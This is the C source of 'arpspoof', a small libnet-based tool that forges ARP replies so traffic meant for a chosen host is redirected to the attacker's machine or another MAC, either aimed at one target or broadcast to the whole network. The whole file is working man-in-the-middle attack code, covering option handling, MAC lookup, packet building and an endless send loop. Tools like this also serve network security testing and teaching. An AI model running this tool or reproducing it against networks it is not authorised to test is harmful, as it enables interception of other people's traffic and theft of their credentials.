/**
 * arpspoof.c
 *
 * Copyright (C) 2010 -  Wei-Ning Huang (AZ) <aitjcize@gmail.com>
 * All Rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <arpa/inet.h>
#include <getopt.h>
#include <net/if_arp.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <libnet.h>

#include "utils.h"
#include "arp_utils.h"

#define IP_ADDR_LEN 4

void usage(void);
void start_spoof(int send_interval);

const char* program_name = "arpspoof";
const char* program_version = "0.2";

static struct option longopts[] = {
  { "interface",  required_argument, NULL, 'i' },
  { "interval" ,  required_argument, NULL, 'n' },
  { "target",     required_argument, NULL, 't' },
  { "redirect",   required_argument, NULL, 'r' },
  { "verbose",    no_argument,       NULL, 'v' },
  { "help",       no_argument,       NULL, 'h' },
};

/* flags */
int g_verbose_mode = 0;

/* global variables */
libnet_t* lnc = 0;
in_addr_t tgt_ip = 0, red_ip = 0, spf_ip = 0;
struct libnet_ether_addr tgt_mac, red_mac;
char* intf = NULL;                     /* interface */

int main(int argc, char *argv[])
{
  char err_buf[LIBNET_ERRBUF_SIZE > PCAP_ERRBUF_SIZE?
               LIBNET_ERRBUF_SIZE: PCAP_ERRBUF_SIZE];
  int opt = 0;
  int send_interval = 1000000;           /* send interval in usecond */
  char* target_ip_str = NULL;            /* IP which packets is sent to */
  char* spoof_ip_str = NULL;             /* IP we want to intercept packets */
  char* redirect_ip_str  = NULL;         /* IP of MAC we want to redirect 
                                            packets to, if not specified,
                                            attacker's MAC is used */

  while ((opt = getopt_long(argc, argv, "i:n:t:r:hv", longopts, NULL)) != -1) {
    switch(opt) {
      case 'i':
        intf = optarg;
        break;
      case 'n':
        send_interval = atoi(optarg);
        break;
      case 't':
        target_ip_str = optarg;
        break;
      case 'r':
        redirect_ip_str = optarg;
        break;
      case 'v':
        g_verbose_mode = 1;
        break;
      case 'h':
        usage();
        exit(0);
      default:
        usage();
        exit(1);
    }
  }

  slog_init(program_name, g_verbose_mode);

  /* check if use is root */
  if (getuid() && geteuid())
    slog(L_FATAL, 0, "must run as root\n");

  if (!intf)
    slog(L_FATAL, 0, "must specify interface\n");

  if (optind == argc)
    slog(L_FATAL, 0, "must specified host IP address\n");

  /* libnet init */
  if (!(lnc = libnet_init(LIBNET_LINK_ADV, intf, err_buf)))
    slog(L_FATAL, 0, "libnet_init(): %s\n", libnet_geterror(lnc));
  else
    slog(L_INFO, 0, "libnet_init()\n");

  /* If target not specified, set to broadcast */
  if (target_ip_str) {
    if (-1 == (tgt_ip = libnet_name2addr4(lnc, target_ip_str, LIBNET_RESOLVE)))
      slog(L_LIBNET, lnc, "invalid target IP address\n");
    if (!get_mac_by_ip(intf, tgt_ip, &tgt_mac))
      slog(L_FATAL, 0, "can't resolve MAC address for %s\n", target_ip_str);
  } else
    memcpy(tgt_mac.ether_addr_octet,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN);

  /* If redirect IP not specified, packets are redirect to the attacker */
  if (redirect_ip_str) {
    if (-1 == (red_ip = libnet_name2addr4(lnc,redirect_ip_str,LIBNET_RESOLVE)))
      slog(L_LIBNET, lnc, "invalid redirect IP address\n");
    if (!get_mac_by_ip(intf, red_ip, &red_mac))
      slog(L_FATAL, 0, "can't resolve MAC address for %s\n",redirect_ip_str);
  } else {
    slog(L_INFO, 0, "redirect IP not specified, using localhost\n");
    struct libnet_ether_addr* ptmp = libnet_get_hwaddr(lnc);
    if (ptmp == NULL)
      slog(L_LIBNET, lnc, "can't resolve MAC address for localhost\n");
    memcpy(red_mac.ether_addr_octet, ptmp->ether_addr_octet, ETHER_ADDR_LEN);
  }

  spoof_ip_str = argv[optind];
  if (-1 == (spf_ip = libnet_name2addr4(lnc, spoof_ip_str, LIBNET_RESOLVE)))
    slog(L_LIBNET, lnc, "invalid host IP address\n");

  build_arp(lnc, ARPOP_REPLY, (u_int8_t*)&spf_ip, (u_int8_t*)&red_mac,
                              (u_int8_t*)&tgt_ip, (u_int8_t*)&tgt_mac);

  start_spoof(send_interval);

  return 0;
}

void start_spoof(int send_interval) {
  int size = 0, c = 0;

  slog(L_INFO, 0, "start sending packets\n");
  while (1) {
    if (-1 == (size = libnet_write(lnc))) {
      slog(L_LIBNET, lnc, "can't send packet\n");
    }
    if (tgt_ip != 0) {
      slog(L_MSG, 0, "%s: %d bytes, target: %s: %s is at ", intf, size,
        libnet_addr2name4(tgt_ip, LIBNET_DONT_RESOLVE),
        libnet_addr2name4(spf_ip, LIBNET_DONT_RESOLVE));
      for (c = 0; c < 6; c++)
        slog(L_MSG, 0, "%.2x%c", ((u_char*)&red_mac)[c], (c < 5)? ':': '\n');
    } else {
      slog(L_MSG, 0, "%s: %d bytes, target: broadcasting: %s is at ", intf, size,
        libnet_addr2name4(spf_ip, LIBNET_DONT_RESOLVE));
      for (c = 0; c < 6; c++)
        slog(L_MSG, 0, "%.2x%c", ((u_char*)&red_mac)[c], (c < 5)? ':': '\n');
    }
    usleep(send_interval);
  }
}

void usage(void) {
  fprintf(stderr, "%s %s, by Wei-Ning Huang <aitjcize@gmail.com>\n",
      program_name, program_version);
  fprintf(stderr, "Usage: %s [-v] [-i interface] [-t target] [-r redirect] "
                  "host\n\n", program_name);
  fprintf(stderr,
"  -i, --interface   interface\n"
"  -t, --target      target IP, IP which ARP reply packets is sent to\n"
"  -r, --redifect    redirect IP, IP which we want to redirect packet to, if\n"
"                    not spefified, local MAC is used\n"
"  -v, --vebose      verbose mode\n"
"  -h, --help        show this help list\n"
"  host              the host you wish to intercept packets for\n");
}
